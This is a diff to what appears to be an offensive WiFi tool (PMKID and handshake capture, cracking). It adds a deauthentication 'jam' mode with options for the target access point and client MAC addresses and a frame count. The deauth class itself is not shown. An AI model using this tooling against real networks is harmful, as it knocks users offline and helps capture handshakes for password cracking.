@@ -23,6 +23,7 @@ from wireless import eAPoL
 from wireless import PMKID
 from wireless import CAPTURE_PMKID
 from wireless import CAPTURE_HAND
+from wireless import DEAUTH
 from scapy.utils import rdpcap
 from scapy.utils import PcapWriter
 from utils import tabulate
@@ -386,6 +387,14 @@ class Moder:
 			else:
 				pull.error("Invalid Capture! Are you sure this is the valid capture?")
 				sys.exit(-1)
+
+	def silent_deauth_mode(self, iface, _deauth, _ap, _cl, _count):
+		_silent = DEAUTH(iface.iface, _deauth, _ap, _cl, _count, pull, V__)
+		_silent.locate()
+		if _silent.verify():
+			_silent.jam()
+		else:
+			pull.error("Not able to Find such network %s[%s]%s" % (pull.RED, _ap.replace(':', '').upper(), pull.END )); sys.exit(-1)
 			
 
 ##########################
@@ -394,7 +403,7 @@ class Moder:
 
 def grace_exit(sig, frame):
 	pull.special("Closing. Cleaning up the mess! ")
-	time.sleep(1)
+	time.sleep(0.50)
 	sys.exit(0)
 
 def _writer(options):
@@ -441,6 +450,13 @@ def _typer(options):
 	else:
 		pull.special("No Capture Type Specified. See the manual (-h, --help)"); sys.exit(-1)
 
+def _channel_verifier(ch):
+	__channels = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14)
+	if ch in __channels:
+		return ch
+	else:
+		return False
+
 def _channeler(options):
 	if options.interface != None:
 		iface = interface(options.interface)
@@ -451,8 +467,7 @@ def _channeler(options):
 			pull.special("Channel Specified: %s Hopper Status [%s]" % (pull.RED+"NONE"+pull.END, pull.GREEN+"Running"+pull.END))
 			iface.hopper()
 		else:
-			__channels = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14)
-			if options.channel in __channels:
+			if _channel_verifier(options.channel):
 				iface.put_channel(options.channel)
 				pull.info("Channel Specified: %s Hopper Status [%s]" % (pull.GREEN+str(options.channel)+pull.END, pull.GREEN+"Stopped"+pull.END))
 			else:
@@ -486,6 +501,24 @@ def _crack_filer(options):
 		else:
 			pull.special("No Such File: %s[%s]%s" % (pull.RED, _file, pull.END)); sys.exit(-1)
 
+def _detargeter(options):
+	_ap, _cl = '', ''
+	if options.ap:
+		if re.match("^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", options.ap, re.I):
+			_ap = options.ap
+		else:
+			pull.error("Not a Valid MAC address for Access Point!"); sys.exit(-1)
+	if options.client:
+		if re.match("^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", options.client, re.I):
+			_cl = options.client
+		else:
+			pull.error("Not a Valid MAC address for STA!"); sys.exit(-1)
+	return _ap.lower(), _cl.lower()
+
+def _deauth_counter(options):
+	if options.deauthcount is None:
+		pull.error("How much frames you want to send? Specify -0/--count option."); sys.exit(-1)
+
 def main():
 	global WRITE__, DICTIONARY, NEW_HAND, V__, _KEY_, _HANDSHAKE
 	global _CRACK
@@ -507,6 +540,10 @@ def main():
 	parser.add_option('', '--type', dest='type', type='string', help="Type of Cracking")
 	parser.add_option('', '--list-types', dest='listTypes', default=False, action="store_true", help="List of Available types")
 	parser.add_option('-r', '--read', dest='read', type='string', help='Read capture in mode 3')
+	
+	parser.add_option('', '--ap', dest='ap', type="string", help="Access Point BSSID")
+	parser.add_option('', '--client', dest='client', type="string", help="STA (Client) BSSID")
+	parser.add_option('-0', '--count', dest='deauthcount', type="int", help="Number of Deauth Frames to Send")
 	
 	(options, args) = parser.parse_args()
 
@@ -544,6 +581,7 @@ def main():
 		else:
 			pull.special("This attack only works for WPA2 networks")
 			sys.exit(0)
+
 	elif options.mode == 3:
 		if options.help:
 			pull.help(3); sys.exit(0)
@@ -552,6 +590,14 @@ def main():
 		_type = _typer(options); DICTIONARY = _wordlister(options); _file = _crack_filer(options)
 		_modler = Moder(options.mode)
 		_modler.crack_mode(_type, _file, options.essid)
+
+	elif options.mode == 4:
+		if options.help:
+			pull.help(4); sys.exit(0)
+		iface = _channeler(options); _modler = Moder(options.mode); _deauth_counter(options)
+		signal(SIGINT, grace_exit)
+		_tgt = _detargeter(options); _modler.silent_deauth_mode(iface, options.deauth, _tgt[0], _tgt[1], options.deauthcount)
+
 
 if __name__ == "__main__":
 	pull = Pully()
